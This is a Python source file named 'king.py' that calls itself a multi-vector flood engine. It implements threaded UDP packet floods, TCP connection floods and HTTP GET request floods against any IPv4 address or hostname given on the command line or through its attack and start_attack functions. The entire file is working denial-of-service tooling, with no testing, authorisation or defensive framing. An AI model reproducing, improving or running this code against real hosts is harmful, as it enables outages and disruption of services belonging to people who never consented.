#!/usr/bin/env python3
"""
king.py — multi-vector flood engine (UDP, TCP, HTTP).

Every attack function returns a dict:
    {"workers": int, "sent": int, "errors": int, "last_error": str}

Targets accept:
    '1.2.3.4', '1.2.3.4:443', 'host.com', 'host.com:443'
IPv6 rejected with ValueError.
"""

import socket
import sys
import threading
import time

__all__ = ["attack", "start_attack", "_resolve", "VECTORS"]

VECTORS = ("udp", "tcp", "http")


# ── target normalization ──────────────────────────────────────────────────

def _resolve(target):
    if not isinstance(target, str) or not target.strip():
        raise ValueError(f"empty target: {target!r}")

    t = target.strip()

    if t.startswith("["):
        end = t.find("]")
        if end == -1:
            raise ValueError(f"malformed IPv6 target: {target!r}")
        inner = t[1:end]
        try:
            socket.inet_pton(socket.AF_INET6, inner)
        except OSError as e:
            raise ValueError(f"invalid IPv6 address: {target!r}") from e
        raise ValueError(f"IPv6 target not supported: {target!r}")

    if t.count(":") == 1:
        host, _, maybe_port = t.partition(":")
        if maybe_port.isdigit() and 0 < int(maybe_port) < 65536:
            t = host

    try:
        socket.inet_pton(socket.AF_INET, t)
        return t
    except OSError:
        pass

    return socket.gethostbyname(t)


def _validate(target, port, duration, threads):
    try:
        port = int(port)
    except (TypeError, ValueError):
        raise ValueError(f"port must be int, got {port!r}")
    if not (0 < port < 65536):
        raise ValueError(f"port out of range: {port}")

    try:
        duration = int(duration)
    except (TypeError, ValueError):
        raise ValueError(f"duration must be int, got {duration!r}")
    if duration <= 0:
        raise ValueError(f"duration must be > 0, got {duration}")

    try:
        threads = int(threads)
    except (TypeError, ValueError):
        raise ValueError(f"threads must be int, got {threads!r}")
    if threads <= 0:
        raise ValueError(f"threads must be > 0, got {threads}")

    ip = _resolve(target)
    return ip, port, duration, threads


# ── UDP ───────────────────────────────────────────────────────────────────

def _udp_worker(sock, ip, port, end_time, payload, stats):
    while time.time() < end_time:
        try:
            sock.sendto(payload, (ip, port))
            stats["sent"] += 1
        except OSError as e:
            stats["errors"] += 1
            stats["last_error"] = f"{type(e).__name__}: {e}"


def attack_udp(ip, port, duration, threads, payload_size=1024):
    end_time = time.time() + duration
    payload = b"\x00" * payload_size
    stats = {"sent": 0, "errors": 0, "last_error": ""}

    socks = []
    for _ in range(threads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except OSError:
            break

    if not socks:
        raise RuntimeError("Socket creation failed")

    workers = []
    for s in socks:
        t = threading.Thread(target=_udp_worker,
                             args=(s, ip, port, end_time, payload, stats),
                             daemon=True)
        try:
            t.start()
            workers.append(t)
        except RuntimeError:
            break

    if not workers:
        for s in socks:
            try:
                s.close()
            except OSError:
                pass
        raise RuntimeError("Thread creation failed")

    for t in workers:
        t.join()
    for s in socks:
        try:
            s.close()
        except OSError:
            pass

    return {
        "workers": len(workers),
        "sent": stats["sent"],
        "errors": stats["errors"],
        "last_error": stats["last_error"],
    }


# ── TCP ───────────────────────────────────────────────────────────────────

def _tcp_worker(ip, port, end_time, stats):
    while time.time() < end_time:
        try:
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.settimeout(2.0)
            c.connect((ip, port))
            c.send(b"\x00" * 64)
            try:
                c.recv(64)
            except OSError:
                pass
            c.close()
            stats["sent"] += 1
        except OSError as e:
            stats["errors"] += 1
            stats["last_error"] = f"{type(e).__name__}: {e}"


def attack_tcp(ip, port, duration, threads):
    end_time = time.time() + duration
    stats = {"sent": 0, "errors": 0, "last_error": ""}

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=_tcp_worker,
                             args=(ip, port, end_time, stats),
                             daemon=True)
        try:
            t.start()
            workers.append(t)
        except RuntimeError:
            break

    if not workers:
        raise RuntimeError("Thread creation failed")

    for t in workers:
        t.join()

    return {
        "workers": len(workers),
        "sent": stats["sent"],
        "errors": stats["errors"],
        "last_error": stats["last_error"],
    }


# ── HTTP ──────────────────────────────────────────────────────────────────

def _http_worker(ip, port, end_time, req, stats):
    while time.time() < end_time:
        try:
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.settimeout(2.0)
            c.connect((ip, port))
            c.send(req)
            try:
                c.recv(1024)
            except OSError:
                pass
            c.close()
            stats["sent"] += 1
        except OSError as e:
            stats["errors"] += 1
            stats["last_error"] = f"{type(e).__name__}: {e}"


def attack_http(ip, port, duration, threads, path="/"):
    end_time = time.time() + duration
    req = (f"GET {path} HTTP/1.1\r\n"
           f"Host: {ip}\r\n"
           f"User-Agent: Mozilla/5.0\r\n"
           f"Connection: keep-alive\r\n\r\n").encode()
    stats = {"sent": 0, "errors": 0, "last_error": ""}

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=_http_worker,
                             args=(ip, port, end_time, req, stats),
                             daemon=True)
        try:
            t.start()
            workers.append(t)
        except RuntimeError:
            break

    if not workers:
        raise RuntimeError("Thread creation failed")

    for t in workers:
        t.join()

    return {
        "workers": len(workers),
        "sent": stats["sent"],
        "errors": stats["errors"],
        "last_error": stats["last_error"],
    }


# ── dispatcher ────────────────────────────────────────────────────────────

def attack(target, port, duration, threads=100, payload_size=1024, vector="udp"):
    vector = (vector or "udp").lower()
    if vector not in VECTORS:
        raise ValueError(f"unknown vector {vector!r}; use one of {VECTORS}")

    ip, port, duration, threads = _validate(target, port, duration, threads)

    if vector == "udp":
        try:
            payload_size = int(payload_size)
        except (TypeError, ValueError):
            raise ValueError(f"payload_size must be int, got {payload_size!r}")
        if payload_size <= 0:
            raise ValueError(f"payload_size must be > 0, got {payload_size}")
        return attack_udp(ip, port, duration, threads, payload_size)

    if vector == "tcp":
        return attack_tcp(ip, port, duration, threads)

    return attack_http(ip, port, duration, threads)


def start_attack(target, port, duration, threads=100,
                 payload_size=1024, vector="udp"):
    t = threading.Thread(target=attack,
                         args=(target, port, duration, threads, payload_size, vector),
                         daemon=True)
    t.start()
    return t


# ── CLI ───────────────────────────────────────────────────────────────────

def _main(argv):
    if len(argv) not in (5, 6):
        print(f"Usage: {argv[0]} <target> <port> <duration> <threads> [vector]")
        return 1
    target, port, duration, threads = argv[1:5]
    vector = argv[5] if len(argv) == 6 else "udp"
    try:
        r = attack(target, int(port), int(duration), int(threads), vector=vector)
    except (ValueError, RuntimeError, socket.gaierror) as e:
        print(f"Error: {e}", file=sys.stderr)
        return 2
    print(f"workers={r['workers']}  sent={r['sent']}  errors={r['errors']}  vector={vector}")
    if r["last_error"]:
        print(f"last_error: {r['last_error']}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(_main(sys.argv))
